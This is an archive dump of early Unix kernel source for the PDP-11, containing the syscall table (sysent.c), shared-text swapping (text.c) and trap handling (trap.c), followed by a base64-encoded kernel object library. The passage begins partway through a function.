		if(u.u_uid != 0 && u.u_uid != p->p_uid)
			continue;
		f++;
		psignal(p, u.u_arg[0]);
	}
	if(f == 0)
		u.u_error = ESRCH;
}

times()
{
	register *p;

	for(p = &u.u_utime; p  < &u.u_utime+6;) {
		suword(u.u_arg[0], *p++);
		u.u_arg[0] =+ 2;
	}
}

profil()
{

	u.u_prof[0] = u.u_arg[0] & ~1;	/* base of sample buf */
	u.u_prof[1] = u.u_arg[1];	/* size of same */
	u.u_prof[2] = u.u_arg[2];	/* pc offset */
	u.u_prof[3] = (u.u_arg[3]>>1) & 077777; /* pc scale */
}
-- /usr/sys/ken/sysent.c mode=0100664 uid=3 gid=3 atime=174921788 mtime=174843268 --
#
/*
 */

/*
 * This table is the switch used to transfer
 * to the appropriate routine for processing a system call.
 * Each row contains the number of arguments expected
 * and a pointer to the routine.
 */
int	sysent[]
{
	0, &nullsys,			/*  0 = indir */
	0, &rexit,			/*  1 = exit */
	0, &fork,			/*  2 = fork */
	2, &read,			/*  3 = read */
	2, &write,			/*  4 = write */
	2, &open,			/*  5 = open */
	0, &close,			/*  6 = close */
	0, &wait,			/*  7 = wait */
	2, &creat,			/*  8 = creat */
	2, &link,			/*  9 = link */
	1, &unlink,			/* 10 = unlink */
	2, &exec,			/* 11 = exec */
	1, &chdir,			/* 12 = chdir */
	0, &gtime,			/* 13 = time */
	3, &mknod,			/* 14 = mknod */
	2, &chmod,			/* 15 = chmod */
	2, &chown,			/* 16 = chown */
	1, &sbreak,			/* 17 = break */
	2, &stat,			/* 18 = stat */
	2, &seek,			/* 19 = seek */
	0, &getpid,			/* 20 = getpid */
	3, &smount,			/* 21 = mount */
	1, &sumount,			/* 22 = umount */
	0, &setuid,			/* 23 = setuid */
	0, &getuid,			/* 24 = getuid */
	0, &stime,			/* 25 = stime */
	3, &ptrace,			/* 26 = ptrace */
	0, &nosys,			/* 27 = x */
	1, &fstat,			/* 28 = fstat */
	0, &nosys,			/* 29 = x */
	1, &nullsys,			/* 30 = smdate; inoperative */
	1, &stty,			/* 31 = stty */
	1, &gtty,			/* 32 = gtty */
	0, &nosys,			/* 33 = x */
	0, &nice,			/* 34 = nice */
	0, &sslep,			/* 35 = sleep */
	0, &sync,			/* 36 = sync */
	1, &kill,			/* 37 = kill */
	0, &getswit,			/* 38 = switch */
	0, &nosys,			/* 39 = x */
	0, &nosys,			/* 40 = x */
	0, &dup,			/* 41 = dup */
	0, &pipe,			/* 42 = pipe */
	1, &times,			/* 43 = times */
	4, &profil,			/* 44 = prof */
	0, &nosys,			/* 45 = tiu */
	0, &setgid,			/* 46 = setgid */
	0, &getgid,			/* 47 = getgid */
	2, &ssig,			/* 48 = sig */
	0, &nosys,			/* 49 = x */
	0, &nosys,			/* 50 = x */
	0, &nosys,			/* 51 = x */
	0, &nosys,			/* 52 = x */
	0, &nosys,			/* 53 = x */
	0, &nosys,			/* 54 = x */
	0, &nosys,			/* 55 = x */
	0, &nosys,			/* 56 = x */
	0, &nosys,			/* 57 = x */
	0, &nosys,			/* 58 = x */
	0, &nosys,			/* 59 = x */
	0, &nosys,			/* 60 = x */
	0, &nosys,			/* 61 = x */
	0, &nosys,			/* 62 = x */
	0, &nosys			/* 63 = x */
};
-- /usr/sys/ken/text.c mode=0100664 uid=3 gid=3 atime=174921795 mtime=174843274 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../proc.h"
#include "../text.h"
#include "../inode.h"

/*
 * Swap out process p.
 * The ff flag causes its core to be freed--
 * it may be off when called to create an image for a
 * child process in newproc.
 * Os is the old size of the data area of the process,
 * and is supplied during core expansion swaps.
 *
 * panic: out of swap space
 * panic: swap error -- IO error
 */
xswap(p, ff, os)
int *p;
{
	register *rp, a;

	rp = p;
	if(os == 0)
		os = rp->p_size;
	a = malloc(swapmap, (rp->p_size+7)/8);
	if(a == NULL)
		panic("out of swap space");
	xccdec(rp->p_textp);
	rp->p_flag =| SLOCK;
	if(swap(a, rp->p_addr, os, 0))
		panic("swap error");
	if(ff)
		mfree(coremap, os, rp->p_addr);
	rp->p_addr = a;
	rp->p_flag =& ~(SLOAD|SLOCK);
	rp->p_time = 0;
	if(runout) {
		runout = 0;
		wakeup(&runout);
	}
}

/*
 * relinquish use of the shared text segment
 * of a process.
 */
xfree()
{
	register *xp, *ip;

	if((xp=u.u_procp->p_textp) != NULL) {
		u.u_procp->p_textp = NULL;
		xccdec(xp);
		if(--xp->x_count == 0) {
			ip = xp->x_iptr;
			if((ip->i_mode&ISVTX) == 0) {
				xp->x_iptr = NULL;
				mfree(swapmap, (xp->x_size+7)/8, xp->x_daddr);
				ip->i_flag =& ~ITEXT;
				iput(ip);
			}
		}
	}
}

/*
 * Attach to a shared text segment.
 * If there is no shared text, just return.
 * If there is, hook up to it:
 * if it is not currently being used, it has to be read
 * in from the inode (ip) and established in the swap space.
 * If it is being used, but is not currently in core,
 * a swap has to be done to get it back.
 * The full coroutine glory has to be invoked--
 * see slp.c-- because if the calling process
 * is misplaced in core the text image might not fit.
 * Quite possibly the code after "out:" could check to
 * see if the text does fit and simply swap it in.
 *
 * panic: out of swap space
 */
xalloc(ip)
int *ip;
{
	register struct text *xp;
	register *rp, ts;

	if(u.u_arg[1] == 0)
		return;
	rp = NULL;
	for(xp = &text[0]; xp < &text[NTEXT]; xp++)
		if(xp->x_iptr == NULL) {
			if(rp == NULL)
				rp = xp;
		} else
			if(xp->x_iptr == ip) {
				xp->x_count++;
				u.u_procp->p_textp = xp;
				goto out;
			}
	if((xp=rp) == NULL)
		panic("out of text");
	xp->x_count = 1;
	xp->x_ccount = 0;
	xp->x_iptr = ip;
	ts = ((u.u_arg[1]+63)>>6) & 01777;
	xp->x_size = ts;
	if((xp->x_daddr = malloc(swapmap, (ts+7)/8)) == NULL)
		panic("out of swap space");
	expand(USIZE+ts);
	estabur(0, ts, 0, 0);
	u.u_count = u.u_arg[1];
	u.u_offset[1] = 020;
	u.u_base = 0;
	readi(ip);
	rp = u.u_procp;
	rp->p_flag =| SLOCK;
	swap(xp->x_daddr, rp->p_addr+USIZE, ts, 0);
	rp->p_flag =& ~SLOCK;
	rp->p_textp = xp;
	rp = ip;
	rp->i_flag =| ITEXT;
	rp->i_count++;
	expand(USIZE);

out:
	if(xp->x_ccount == 0) {
		savu(u.u_rsav);
		savu(u.u_ssav);
		xswap(u.u_procp, 1, 0);
		u.u_procp->p_flag =| SSWAP;
		swtch();
		/* no return */
	}
	xp->x_ccount++;
}

/*
 * Decrement the in-core usage count of a shared text segment.
 * When it drops to zero, free the core space.
 */
xccdec(xp)
int *xp;
{
	register *rp;

	if((rp=xp)!=NULL && rp->x_ccount!=0)
		if(--rp->x_ccount == 0)
			mfree(coremap, rp->x_size, rp->x_caddr);
}
-- /usr/sys/ken/trap.c mode=0110664 uid=3 gid=3 atime=174921804 mtime=174907551 --
#
#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../proc.h"
#include "../reg.h"
#include "../seg.h"

#define	EBIT	1		/* user error bit in PS: C-bit */
#define	UMODE	0170000		/* user-mode bits in PS word */
#define	SETD	0170011		/* SETD instruction */
#define	SYS	0104400		/* sys (trap) instruction */
#define	USER	020		/* user-mode flag added to dev */

/*
 * structure of the system entry table (sysent.c)
 */
struct sysent	{
	int	count;		/* argument count */
	int	(*call)();	/* name of handler */
} sysent[64];

/*
 * Offsets of the user's registers relative to
 * the saved r0. See reg.h
 */
char	regloc[9]
{
	R0, R1, R2, R3, R4, R5, R6, R7, RPS
};

/*
 * Called from l40.s or l45.s when a processor trap occurs.
 * The arguments are the words saved on the system stack
 * by the hardware and software during the trap processing.
 * Their order is dictated by the hardware and the details
 * of C's calling sequence. They are peculiar in that
 * this call is not 'by value' and changed user registers
 * get copied back on return.
 * dev is the kind of trap that occurred.
 */
trap(dev, sp, r1, nps, r0, pc, ps)
{
	register i, a;
	register struct sysent *callp;

	savfp();
	if ((ps&UMODE) == UMODE)
		dev =| USER;
	u.u_ar0 = &r0;
	switch(dev) {

	/*
	 * Trap not expected.
	 * Usually a kernel mode bus error.
	 * The numbers printed are used to
	 * find the hardware PS/PC as follows.
	 * (all numbers in octal 18 bits)
	 *	address_of_saved_ps =
	 *		(ka6*0100) + aps - 0140000;
	 *	address_of_saved_pc =
	 *		address_of_saved_ps - 2;
	 */
	default:
		printf("ka6 = %o\n", *ka6);
		printf("aps = %o\n", &ps);
		printf("trap type %o\n", dev);
		panic("trap");

	case 0+USER: /* bus error */
		i = SIGBUS;
		break;

	/*
	 * If illegal instructions are not
	 * being caught and the offending instruction
	 * is a SETD, the trap is ignored.
	 * This is because C produces a SETD at
	 * the beginning of every program which
	 * will trap on CPUs without 11/45 FPU.
	 */
	case 1+USER: /* illegal instruction */
		if(fuiword(pc-2) == SETD && u.u_signal[SIGINS] == 0)
			goto out;
		i = SIGINS;
		break;

	case 2+USER: /* bpt or trace */
		i = SIGTRC;
		break;

	case 3+USER: /* iot */
		i = SIGIOT;
		break;

	case 5+USER: /* emt */
		i = SIGEMT;
		break;

	case 6+USER: /* sys call */
		u.u_error = 0;
		ps =& ~EBIT;
		callp = &sysent[fuiword(pc-2)&077];
		if (callp == sysent) { /* indirect */
			a = fuiword(pc);
			pc =+ 2;
			i = fuword(a);
			if ((i & ~077) != SYS)
				i = 077;	/* illegal */
			callp = &sysent[i&077];
			for(i=0; i<callp->count; i++)
				u.u_arg[i] = fuword(a =+ 2);
		} else {
			for(i=0; i<callp->count; i++) {
				u.u_arg[i] = fuiword(pc);
				pc =+ 2;
			}
		}
		u.u_dirp = u.u_arg[0];
		trap1(callp->call);
		if(u.u_intflg)
			u.u_error = EINTR;
		if(u.u_error < 100) {
			if(u.u_error) {
				ps =| EBIT;
				r0 = u.u_error;
			}
			goto out;
		}
		i = SIGSYS;
		break;

	/*
	 * Since the floating exception is an
	 * imprecise trap, a user generated
	 * trap may actually come from kernel
	 * mode. In this case, a signal is sent
	 * to the current process to be picked
	 * up later.
	 */
	case 8: /* floating exception */
		psignal(u.u_procp, SIGFPT);
		return;

	case 8+USER:
		i = SIGFPT;
		break;

	/*
	 * If the user SP is below the stack segment,
	 * grow the stack automatically.
	 * This relies on the ability of the hardware
	 * to restart a half executed instruction.
	 * On the 11/40 this is not the case and
	 * the routine backup/l40.s may fail.
	 * The classic example is on the instruction
	 *	cmp	-(sp),-(sp)
	 */
	case 9+USER: /* segmentation exception */
		a = sp;
		if(backup(u.u_ar0) == 0)
		if(grow(a))
			goto out;
		i = SIGSEG;
		break;
	}
	psignal(u.u_procp, i);

out:
	if(issig())
		psig();
	setpri(u.u_procp);
}

/*
 * Call the system-entry routine f (out of the
 * sysent table). This is a subroutine for trap, and
 * not in-line, because if a signal occurs
 * during processing, an (abnormal) return is simulated from
 * the last caller to savu(qsav); if this took place
 * inside of trap, it wouldn't have a chance to clean up.
 *
 * If this occurs, the return takes place without
 * clearing u_intflg; if it's still set, trap
 * marks an error which means that a system
 * call (like read on a typewriter) got interrupted
 * by a signal.
 */
trap1(f)
int (*f)();
{

	u.u_intflg = 1;
	savu(u.u_qsav);
	(*f)();
	u.u_intflg = 0;
}

/*
 * nonexistent system call-- set fatal error code.
 */
nosys()
{
	u.u_error = 100;
}

/*
 * Ignored system call
 */
nullsys()
{
}
-- /usr/sys/lib1 mode=0110664 uid=3 gid=3 atime=174922105 mtime=174921814 base64=1 --
bf9tYWluLm8AAGwKs+EAtrAMBwGqAyoAAAD4BAAAAAAAAHcJ/P83Cvj/xB/0/8RlEADfFQ
Z/gP8OAQ4R3wkAALcK3v8OEeYVAQDmFQAA3wkAAJYlhAofEaD/DgrfCQAAwAvrBPclRgC4
/xECBAoAEcAMARFXdAwAcBCA8AARwAwwCoLwxGUCAMQlPgDwBsEdkP9XcAUAV3T8/04Q5h
XAA98JAADWC84VAAjmHXT/3wkAANYLNxBq/84dZv/mHWL/5hUAAN8JAACWJcAdVP8fHAIA
rv/fFQZ/jv/3FWb/Qv/OHT7/3wkAAMAl//8OAvcVYPUu/84dKv/fCQAAwCX//wQCzhXKA9
8JAAD3HxT/IP/3FRAAHP/3lQMABv/31QMAAf/3FQAANv//FU0A9P73CfD+9wns/vcJ6P7O
FQEA5h3g/t8JAADWCzcQ1v7/xQEA0P7OFQEA5h3I/t8JAADWCzcQBP//xQEA/v73CbT+wA
sWA84VEQDfCQAADgomCuYVAQAmCt8J9AHGZQYAzhUWACYK5hWqA98JAACWJQIB9wmA/ncA
fP53CXj+wB2w/gIcDgDEFYoAwxXA//clKABi/ggCxOUQAMPlEAADAQAZgGAjEMMloP/6h8
Adgv4EHBQAAgMC7QIAxBWqAMMVoP/3JSgALv4LAsTlEADD5RAABgEjGcs1BAACArPgIADD
JYD/94d3AAz+dwkI/vULCgAgA/clKAD8/RUDTh0EAN8JlgPAJQgADgVOHQgA3wmWAyYQZh
0GAPcJcAHWC4BlwCUIABwE95UMAAH+wBX//18AkgNOHQgA3wmWAyYQZh0GAPcJRgHWCyYQ
Zh0EAPcJOgHWC4BlgGXAJQgA5AVAHQQAQG0GAEBtCADAZRAAwC2E/dkFBArDFWoAwhWKAA
gB0hUCfxMRxGWAAPXlgAAEAPUlgAAEAPQH9QsEAAoDQB0EABd0CADAZQD/wFUCABIQExH1
CwoAAwIFARMKEgrDJXoA+4LEFRAACAHSFQZ/ExHEZYAA9eWAAAYA9SWAAAYA9Af1CwYADw
NAHQYAF3QIAMBlAP/AVQYAEhATEURtBgACARIKEwrDJXoA+4L1CwoAAwIFARIKEwrDJYoA
+4JEbQgACAHE5YAA9eWAAAgA4hUGfyMR9SWAAAgA9Af1CwgADQPAFYAAQO0IABd0CADAVQ
4AIhAAEcBlgP8jEPULCgAQAsMVagDCFXoA0hTDJXoA/ILDFYoAwhWaANIUwyWaAPyC9wn0
/QAKdwBq/HcJZvxAHQQAwGV/ABd0+f93AFb8C4kMAAgA/wEMAAAAL2V0Yy9pbml0AG1lbS
A9ICVsCgBubyBjbG9jawAAAAA5AgAAeQEAANkBAAAAAAAAAAAAAAAAAAAAAGgCAAAZAQAA
AAAAAAAAKAAAAHgCAAAAAAAAAAAAAAAAiAIAAAAAAAAAAFkAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAZAQAAAAAAAAAAAAAAAAQAAADIAgAAAAAAAAAAGQEA
ANgCAAAAABkBAABZAQAAaQEAADgAAAB4AgAAAADZAQAAAAAAAAAAAAAAAAAAAAApAQAAKQ
EAAOgCAAAAAAAAAAAAACkBAAApAQAA6AIAAAAAAAAAAAQAAAAYAwAA2QGpAQAAAACpAQAA
AACpAQAAAACpAQAAqAEJAAAAAAApAQAAKQMAADkDAABJAwAAAAAAADkBAABYAwAAAABJAA
AAAABJAAAAAAAAADkBAABYAwAAAAAJAAAAAAAJAAAAaQMAAAAAAAAAAAAAiAMAAAAAAAAA
AAAAAAACAAAAAAAAAAAAAAAAAAQAAACoAwAAAAAAAMkDAADZAwAAOQIAAAkAAAAAAAAACA
AAAAAAAAAAAFkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAAgA
AAAAAAAAAABZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2QMAADkCAAAAAA
AAAAAAAFkAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAADAAAAAAAAAAAAAAAA
AAAACQAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAAADAAAAAAAAAAAAAAADAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAABkBAAAAAAAACAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAIAAAACAAAAAAACAAAAAAACAAAAAgAAAAAAAgAAAAAAAMAAAAAANkDAAA5AgAAAAAAAA
AAAAAAAAAA2QMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABf
dQAAAAAAACAAIgFfY2Fub25iACAAAAFfY29yZW1hcCAAyABfc3dhcG1hcCAAyABfcm9vdG
RpciAAAgBfY3B1dHlwZSAAAgBfZXhlY250ACAAAgBfbGJvbHQAACAAAgBfdGltZQAAACAA
BABfdG91dAAAACAABABfY2FsbG91dCAAeABfbW91bnQAACAAHgBfbXBpZAAAACAAAgBfcn
VuaW4AACAAAgBfcnVub3V0ACAAAgBfcnVucnVuACAAAgBfY3VycHJpACAAAgBfbWF4bWVt
ACAAAgBfbGtzAAAAACAAAgBfcm9vdGRldiAAAgBfc3dhcGRldiAAAgBfc3dwbG8AACAAAg
BfbnN3YXAAACAAAgBfdXBkbG9jayAAAgBfcmFibG9jayAAAgBfcmVnbG9jACAAAgBfcHJv
YwAAACAATARfdGV4dAAAACAAkAFfaW5vZGUAACAAgAxfa2E2AAAAACAAAgBfaWNvZGUAAC
MAqgNfbWFpbgAAACIAAAB+bWFpbgAAAAIAAABpAAAAAAAAABQABABwAAAAAAAAABQAAwBj
c3YAAAAAACAAAABMMgAAAAAAAAIANABMMjAwMDEAAAIAGABfY2xlYXJzZSAAAABfbWZyZW
UAACAAAABfZnVpYnl0ZSAAAABMNAAAAAAAAAIAbABMMjAwMDMAAAIATABMOAAAAAAAAAMA
wANfcHJpbnRmACAAAABfbWluAAAAACAAAABfZnVpd29yZCAAAABMOQAAAAAAAAIA6ABMMT
EAAAAAAAMAygNfcGFuaWMAACAAAABfY2luaXQAACAAAABfYmluaXQAACAAAABfaWluaXQA
ACAAAABfaWdldAAAACAAAABfbmV3cHJvYyAAAABMMTIAAAAAAAIAfAFfZXhwYW5kACAAAA
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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAaAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAPgBAAAAAAAAAAAAAAAAAAD4AQAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIAgAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAANgDAAAAAAAAAAAAAAAABAAAABgEAAAAAAAACQIAAAIAAABZ
AgAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2Q
IAAFkCAACoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAEAAAAGAQAAAAAAAAAAAAAAAAAAAAAAAAAAKgAAAAAAAQAAACoAgAA2QIAAFkCAABpAQ
AAAABpAQAAqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAeAIAAAAAAAAAAAAAeQAAAAAAeQAAAAAAAAAAAAAAAAAAALgCAAAAAAAA6AQAAAAAAA
CoAAAAAAD4AQAAAAAAAAAAAAAAAHgAAAAAAEgJAAAAAAAAWAkAAAAAAAD4AQAAAABpAQAA
AAAAAGgJAADZAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAX2Nhbm9uYgAgAAABX2NvcmVtYXAgAMgAX3N3YXBtYXAgAMgAX3Jv
b3RkaXIgAAIAX2NwdXR5cGUgAAIAX2V4ZWNudAAgAAIAX2xib2x0AAAgAAIAX3RpbWUAAA
AgAAQAX3RvdXQAAAAgAAQAX2NhbGxvdXQgAHgAX21vdW50AAAgAB4AX21waWQAAAAgAAIA
X3J1bmluAAAgAAIAX3J1bm91dAAgAAIAX3J1bnJ1bgAgAAIAX2N1cnByaQAgAAIAX21heG
1lbQAgAAIAX2xrcwAAAAAgAAIAX3Jvb3RkZXYgAAIAX3N3YXBkZXYgAAIAX3N3cGxvAAAg
AAIAX25zd2FwAAAgAAIAX3VwZGxvY2sgAAIAX3JhYmxvY2sgAAIAX3JlZ2xvYwAgAAIAX2
JkZXZzdwAgAAgAX25ibGtkZXYgAAIAX2NkZXZzdwAgAAoAX25jaHJkZXYgAAIAX2J1ZgAA
AAAgAGgBX2JmcmVlbGkgABgAX2lub2RlAAAgAIAMX3UAAAAAAAAgACIBX2lpbml0AAAiAA
AAfmlpbml0AAACAAAAY3AAAAAAAAAUAAQAYnAAAAAAAAAUAAMAY3N2AAAAAAAgAAAAX2Jy
ZWFkAAAgAAAAX2dldGJsawAgAAAATDIAAAAAAAACAEIATDMAAAAAAAADAPQEX3BhbmljAA
AgAAAAX2Jjb3B5AAAgAAAAX2JyZWxzZQAgAAAAY3JldAAAAAAgAAAAX2FsbG9jAAAiAIQA
fmFsbG9jAAACAIQAYnAAAAAAAAAUAAQAaXAAAAAAAAAUAAMAZnAAAAAAAAAUAAIAZGV2AA
AAAAABAAQAYm5vAAAAAAABAPj/X2dldGZzAAAiAOQDTDUAAAAAAAACAKYATDIwMDAxAAAC
AJYAX3NsZWVwAAAgAAAATDkAAAAAAAACAKwATDEwAAAAAAACAEQBX2JhZGJsb2MiABoCTD
ExAAAAAAACACIBX3dha2V1cAAgAAAAX2NscmJ1ZgAgAAAATDQAAAAAAAACAEABTDEyAAAA
AAADAPoEX3ByZGV2AAAgAAAAX2ZyZWUAAAAiAGABfmZyZWUAAAACAGABZnAAAAAAAAAUAA
QAYnAAAAAAAAAUAAMAaXAAAAAAAAAUAAIAZGV2AAAAAAABAAQAYm5vAAAAAAABAAYATDE0
AAAAAAACAIYBTDIwMDAzAAACAHYBTDEzAAAAAAACABYCTDE2AAAAAAACALABTDE3AAAAAA
ACAP4BX2J3cml0ZQAgAAAAfmJhZGJsb2MCABoCZnAAAAAAAAAUAAQAYm4AAAAAAAAUAAMA
YWJuAAAAAAABAAYAYWZwAAAAAAABAAQAZGV2AAAAAAABAAgATDEwMDAwAAACADYCTDE5AA
AAAAACAEwCTDIwAAAAAAADAAMFTDE4AAAAAAACAEgCX2lhbGxvYwAiAFACfmlhbGxvYwAC
AFACZnAAAAAAAAAUAAQAYnAAAAAAAAAUAAMAaXAAAAAAAAAUAAIAaQAAAAAAAAABAPj/ag
